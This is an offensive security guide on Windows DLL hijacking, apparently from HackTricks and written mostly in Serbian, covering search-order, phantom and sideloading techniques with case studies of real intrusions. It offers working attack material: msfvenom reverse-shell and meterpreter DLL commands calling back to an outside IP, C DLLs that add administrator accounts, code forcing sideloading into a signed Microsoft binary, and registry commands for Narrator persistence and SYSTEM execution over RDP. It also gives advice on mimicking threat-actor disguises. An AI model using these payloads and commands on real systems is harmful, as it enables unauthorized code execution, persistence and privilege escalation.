# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva manipulaciju poverljive aplikacije da učita maliciozni DLL. Ovaj pojam obuhvata nekoliko taktika kao što su **DLL Spoofing, Injection, and Side-Loading**. Uglavnom se koristi za code execution, postizanje persistence, i, ređe, privilege escalation. Iako je ovde fokus na escalation, metoda hijackinga ostaje ista za različite ciljeve.

### Uobičajene tehnike

Koristi se nekoliko metoda za DLL hijacking, a njihova efikasnost zavisi od toga kako aplikacija učitava DLL-ove:

1. **DLL Replacement**: Zamena legitimnog DLL-a malicioznim, opcionalno koristeći DLL Proxying da bi se sačuvala funkcionalnost originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje malicioznog DLL-a u pretraživački put pre legitimnog, iskorišćavajući obrasce pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje malicioznog DLL-a koji će aplikacija pokušati da učita, misleći da je to nepostojeći potreban DLL.
4. **DLL Redirection**: Modifikovanje parametara pretrage kao što su %PATH% ili .exe.manifest / .exe.local fajlovi da usmerite aplikaciju na maliciozni DLL.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a malicioznim u WinSxS direktorijumu, metoda često povezana sa DLL side-loading.
6. **Relative Path DLL Hijacking**: Postavljanje malicioznog DLL-a u direktorijum pod kontrolom korisnika zajedno sa kopiranom aplikacijom, slično Binary Proxy Execution tehnikama.

> [!TIP]
> Za korak-po-korak lanac koji slaže HTML staging, AES-CTR configs i .NET implants preko DLL sideloading-a, pogledajte workflow ispod.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Pronalaženje nedostajućih Dll-ova

Najčešći način da se pronađu nedostajući Dll-ovi u sistemu je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals, **podešavajući** **sledeća 2 filtera**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

i samo prikažite **File System Activity**:

![](<../../../images/image (153).png>)

Ako tražite **nedostajuće dll-ove generalno**, ostavite ovo da radi nekoliko **sekundi**.\
Ako tražite **nedostajući dll unutar specifičnog izvršnog fajla**, treba da postavite **drugi filter** kao što je "Process Name" "contains" `<exec name>`, izvršite ga i zaustavite hvatanje događaja.

## Eksploatisanje nedostajućih Dll-ova

Da bismo eskalirali privilegije, najbolja šansa je da možemo **upisati dll koji će proces sa privilegijama pokušati da učita** na nekom od mesta gde će se tražiti. Dakle, moći ćemo da **upisemo** DLL u **folder** u kome se DLL traži pre foldera gde se nalazi **originalni dll** (neobičan slučaj), ili ćemo moći da **upisemo u folder gde će se dll tražiti**, a originalni **dll ne postoji** ni u jednom folderu.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows applications traže DLL-ove prateći niz **pre-definisanih search path-ova**, po određenom redosledu. Problem DLL hijackinga se javlja kada se zlonamerni DLL strateški postavi u jedan od ovih direktorijuma, tako da bude učitan pre autentičnog DLL-a. Rešenje za sprečavanje ovoga je da aplikacija koristi apsolutne putanje kada referencira potrebne DLL-ove.

Možete videti **DLL search order na 32-bit** sistemima ispod:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

To je **default** redosled pretrage kada je **SafeDllSearchMode** omogućen. Kada je on onemogućen, current directory prelazi na drugo mesto. Da biste isključili ovu funkciju, kreirajte vrednost **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode** i postavite je na 0 (podrazumevano je enabled).

Ako se funkcija [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu izvršnog modula koji **LoadLibraryEx** učitava.

Na kraju, imajte na umu da se **dll može učitati navođenjem apsolutne putanje umesto samo imena**. U tom slučaju taj dll će se **tražiti samo u toj putanji** (ako taj dll ima zavisnosti, one će se tražiti kao da su učitane samo po imenu).

Postoje i drugi načini za promenu redosleda pretrage, ali ih ovde neću objašnjavati.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način da deterministički utičete na DLL search path novokreiranog procesa je podešavanje polja DllPath u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa koristeći ntdll-ove native API-je. Davanjem direktorijuma pod kontrolom napadača ovde, ciljni proces koji rešava uvezeni DLL po imenu (bez apsolutne putanje i ne koristeći safe loading flag-ove) može biti primoran da učita maliciozni DLL iz tog direktorijuma.

Ključna ideja
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Napomene/ograničenja
- Ovo utiče na child process koji se kreira; razlikuje se od SetDllDirectory, koji utiče samo na trenutni proces.
- Cilj mora importovati ili LoadLibrary DLL po imenu (bez apsolutne putanje i ne koristeći LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardkodirane apsolutne putanje se ne mogu hijackovati. Forwarded exports i SxS mogu promeniti prioritet.

Minimalni C primer (ntdll, wide strings, simplified error handling):

<details>
<summary>Puni C primer: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operativni primer upotrebe
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

Ova tehnika je u stvarnom svetu primećena da pokreće multi-stage sideloading chains: inicijalni launcher ostavlja helper DLL, koji potom pokreće Microsoft-signed, hijackable binary sa prilagođenim DllPath-om kako bi se prisililo učitavanje napadačevog DLL-a iz staging directory.

#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- Kada se naiđe na **DLL that shares its name with one already loaded in memory**, sistem preskače uobičajenu pretragu. Umesto toga, izvršiće proveru za redirection i manifest pre nego što podrazumevano koristi DLL koji je već u memoriji. **U ovom scenariju, sistem ne vrši pretragu za DLL**.
- U slučajevima gde je DLL prepoznat kao **known DLL** za trenutnu verziju Windows-a, sistem će koristiti svoju verziju known DLL-a, zajedno sa svim zavisnim DLL-ovima, **forgoing the search process**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih known DLL-ova.
- Ako **DLL have dependencies**, pretraga za ovim dependent DLL-ovima vrši se kao da su naznačeni samo svojim **module names**, bez obzira da li je početni DLL bio identifikovan putem punog puta.

### Escalating Privileges

**Requirements**:

- Identifikujte proces koji radi ili će raditi pod **different privileges** (horizontal or lateral movement), a koji **lacks a DLL**.
- Obezbedite da postoji **write access** za bilo koji **directory** u kojem će se **DLL** tražiti. Ova lokacija može biti direktorijum izvršnog fajla ili direktorijum unutar system path.

Da, zahtevi su komplikovani za pronalaženje jer je po defaultu pomalo čudno pronaći privilegovani izvršni fajl kojem nedostaje DLL i još je čudnije imati write permissions na folderu u system path (to po defaultu ne možete). Ali u pogrešno konfigurisanim okruženjima ovo je moguće.\
Ako ste srećni i ispunjavate zahteve, možete pogledati projekat [UACME](https://github.com/hfiref0x/UACME). Čak i ako je **main goal of the project is bypass UAC**, tamo možete naći **PoC** za Dll hijaking za verziju Windows-a koju možete iskoristiti (verovatno samo menjajući putanju foldera gde imate write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proverite dozvole svih direktorijuma unutar PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti imports of an executable i exports of a dll pomoću:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Za potpuni vodič o tome kako da **abuse Dll Hijacking to escalate privileges** sa permisijama za pisanje u **System Path folder** pogledajte:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) će proveriti da li imate dozvole za pisanje u bilo kojoj fascikli unutar system PATH.\
Drugi interesantni automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll_.

### Example

Ako pronađete eksploatabilan scenario, jedna od najvažnijih stvari za uspešnu eksploataciju biće da **kreirate dll koji eksportuje bar sve funkcije koje će izvršni fajl importovati iz njega**. U svakom slučaju, imajte na umu da Dll Hijacking zna da bude koristan za [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Možete pronaći primer **how to create a valid dll** u ovoj studiji o dll hijackingu fokusiranoj na dll hijacking za izvršenje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Osim toga, u narednom odeljku možete naći neke **basic dll codes** koji mogu biti korisni kao **templates** ili za kreiranje **dll-a sa eksportovanim funkcijama koje nisu potrebne**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

U suštini, **Dll proxy** je Dll sposoban da **izvrši vaš zlonamerni kod kada se učita**, ali i da **izloži** i **radi** kako se očekuje tako što će **prosleđivati sve pozive realnoj biblioteci**.

Sa alatom [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo **navesti izvršni fajl i izabrati biblioteku** koju želite da proxify-ujete i **generisati a proxified dll** ili **navesti Dll** i **generisati a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Dobijte meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreirajte korisnika (x86, nisam našao x64 verziju):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Vaše

Obratite pažnju da u nekoliko slučajeva Dll koji kompajlirate mora da **export several functions** koje će biti učitane od strane victim process; ako ove functions ne postoje, **binary won't be able to load** them i **exploit will fail**.

<details>
<summary>C DLL šablon (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL primer koji kreira korisnika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativni C DLL sa ulazom niti</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studija slučaja: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe i dalje proverava predvidljivi, jezički-specifični localization DLL pri pokretanju koji može biti hijacked za arbitrary code execution i persistence.

Ključne činjenice
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ako na OneCore putanji postoji DLL koja je moguće zapisivati i koju kontroliše napadač, ona se učitava i izvršava se `DllMain(DLL_PROCESS_ATTACH)`. Nisu potrebni exporti.

Otkrivanje pomoću Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Pokrenite Narrator i posmatrajte pokušaj učitavanja gore navedene putanje.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator; your DLL executes as SYSTEM on the secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Tok napada

1. Kao standardni korisnik, postavite `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekajte da se zakazani zadatak pokrene u 9:30 AM u kontekstu trenutnog korisnika.
3. Ako je administrator prijavljen kada se zadatak izvrši, maliciozni DLL se pokreće u administratorskoj sesiji na srednjem integritetu.
4. Povežite standardne UAC bypass tehnike da biste eskalirali sa srednjeg integriteta na SYSTEM privilegije.

## Studija slučaja: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Napadači često kombinuju MSI-based droppers sa DLL side-loading kako bi izvršili payloads pod pouzdanim, potpisanim procesom.

Chain overview
- Korisnik preuzme MSI. A CustomAction se pokreće tiho tokom GUI instalacije (npr. LaunchApplication ili VBScript akcija), rekonstruišući sledeću fazu iz ugrađenih resursa.
- Dropper upisuje legitimni, potpisani EXE i maliciozni DLL u isti direktorijum (primer para: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Kada se potpisani EXE pokrene, redosled pretrage DLL-ova u Windows-u učitava wsc.dll iz radnog direktorijuma prvi, izvršavajući napadačev kod pod potpisanim roditeljem (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction tabela:
- Tražite unose koji pokreću izvršne fajlove ili VBScript. Primer sumnjivog obrasca: LaunchApplication izvršava ugrađeni fajl u pozadini.
- U Orca (Microsoft Orca.exe), pregledajte tabele CustomAction, InstallExecuteSequence i Binary.
- Ugrađeni/podeljeni payloadovi u MSI CAB:
- Administrativno izvlačenje: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ili koristite lessmsi: lessmsi x package.msi C:\out
- Tražite više malih fragmenata koji su konkatenirani i dekriptovani pomoću VBScript CustomAction. Uobičajen tok:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktično sideloading sa wsc_proxy.exe
- Postavite ova dva fajla u isti direktorijum:
- wsc_proxy.exe: legitimno potpisan host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
- wsc.dll: attacker DLL. Ako nisu potrebni specifični exports, DllMain može biti dovoljan; u suprotnom, napravite proxy DLL i prosledite required exports na genuine library dok izvršavate payload u DllMain.
- Izgradite minimalni DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Za zahteve za eksport, koristite proxying framework (npr. DLLirant/Spartacus) da generišete forwarding DLL koji takođe izvršava vaš payload.

- Ova tehnika se oslanja na razrešavanje imena DLL-a od strane host binarnog fajla. Ako host koristi apsolutne putanje ili sigurne flagove za učitavanje (npr. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack može da ne uspe.
- KnownDLLs, SxS i forwarded exports mogu uticati na prioritet i moraju se uzeti u obzir pri izboru host binala i skupa exportovanih funkcija.

## Potpisani trojci + enkriptovani payloadi (studija slučaja ShadowPad)

Check Point je opisao kako Ink Dragon raspoređuje ShadowPad koristeći **trojku od tri fajla** da bi se uklopio u legitimni softver dok su core payload-i enkriptovani na disku:

1. **Signed host EXE** – vendori kao AMD, Realtek ili NVIDIA se zloupotrebljavaju (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Napadači preimenuju izvršni fajl da izgleda kao Windows binarni fajl (na primer `conhost.exe`), ali Authenticode potpis ostaje važeći.
2. **Malicious loader DLL** – postavljen pored EXE sa očekivanim imenom (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL je obično MFC binar obfuskovan ScatterBrain framework-om; njegova jedina uloga je da pronađe enkriptovani blob, dekriptuje ga i reflectively map ShadowPad.
3. **Encrypted payload blob** – često smešten kao `<name>.tmp` u istom direktorijumu. Nakon memory-mappinga dekriptovanog payloada, loader briše TMP fajl da uništi forenzičke dokaze.

Tradecraft napomene:

* Preimenovanje potpisanog EXE-a (uz zadržavanje originalnog `OriginalFileName` u PE header-u) omogućava da se prerušava u Windows binarni fajl, a da zadrži vendor potpis — zato reprodukujte Ink Dragon naviku otpuštanja binarnih fajlova koji liče na `conhost.exe`, a koji su zapravo AMD/NVIDIA utiliti.
* Pošto izvršni fajl ostaje trusted, većina allowlisting kontrola obično zahteva samo da se maliciozni DLL nalazi pored njega. Fokusirajte se na prilagođavanje loader DLL-a; potpisani parent obično može da ostane nepromenjen.
* ShadowPad-ov decryptor očekuje da TMP blob živi pored loader-a i da je zapisiv tako da fajl može biti zero-ovan nakon mapiranja. Ostavite direktorijum zapisiv dok se payload ne učita; nakon što je u memoriji, TMP fajl može bezbedno biti obrisan radi OPSEC-a.

## Studija slučaja: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Jedna nedavna Lotus Blossom intruzija zloupotrebila je trusted update lanac da isporuči NSIS-packed dropper koji je postavio DLL sideload plus potpuno in-memory payload-e.

Tradecraft flow
- `update.exe` (NSIS) kreira `%AppData%\Bluetooth`, označava ga kao **HIDDEN**, ispušta preimenovani Bitdefender Submission Wizard `BluetoothService.exe`, maliciozni `log.dll`, i enkriptovani blob `BluetoothService`, pa zatim pokreće EXE.
- Host EXE importuje `log.dll` i poziva `LogInit`/`LogWrite`. `LogInit` mmap-load-uje blob; `LogWrite` ga dekriptuje koristeći custom LCG-based stream (konstante **0x19660D** / **0x3C6EF35F**, key material izveden iz prethodnog hash-a), prepisuje buffer plaintext shellcode-om, oslobađa temporare i skače na njega.
- Da bi izbegao IAT, loader rešava API-je heširanjem imena export-a koristeći **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, zatim primenjujući Murmur-style avalanche (**0x85EBCA6B**) i poredeći protiv salted target hash-eva.

Glavni shellcode (Chrysalis)
- Dekriptuje PE-like main modul ponavljanjem add/XOR/sub sa ključem `gQ2JR&9;` kroz pet prolaza, zatim dinamički load-uje `Kernel32.dll` → `GetProcAddress` da završi rešavanje import-a.
- Rekonstruiše DLL stringove za imena u runtime-u preko per-character bit-rotate/XOR transformacija, zatim ucitava `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Koristi drugi resolver koji šeta **PEB → InMemoryOrderModuleList**, parsira svaki export table u 4-byte blokovima sa Murmur-style mešanjem, i samo se vraća na `GetProcAddress` ako heš nije pronađen.

Ugrađena konfiguracija & C2
- Konfiguracija se nalazi unutar ispuštenog `BluetoothService` fajla na **offset 0x30808** (veličina **0x980**) i RC4-dekriptovana je ključem `qwhvb^435h&*7`, otkrivajući C2 URL i User-Agent.
- Beaconi prave tačkama odvojeni host profil, prepandaju tag `4Q`, zatim RC4-enkriptuju ključem `vAuig34%^325hGV` pre nego što pozovu `HttpSendRequestA` preko HTTPS-a. Odgovori se RC4-dekriptuju i dispatch-uju putem tag switch-a (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode je uslovljen CLI arg-ovima: bez arg-ova = instalira persistence (service/Run key) koji pokazuje na `-i`; `-i` relaunch-uje sebe sa `-k`; `-k` preskače instalaciju i izvršava payload.

Primećen alternativni loader
- Ista intruzija je ispusila Tiny C Compiler i izvršila `svchost.exe -nostdlib -run conf.c` iz `C:\ProgramData\USOShared\`, sa `libtcc.dll` pored. Napadačem-dostavljen C source je embedovao shellcode, kompajlirao ga i izvršio in-memory bez dodirivanja diska sa PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ova TCC-based compile-and-run faza importovala je `Wininet.dll` tokom runtime-a i povukla second-stage shellcode sa hardkodiranog URL-a, omogućavajući fleksibilan loader koji se predstavlja kao pokretanje kompajlera.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
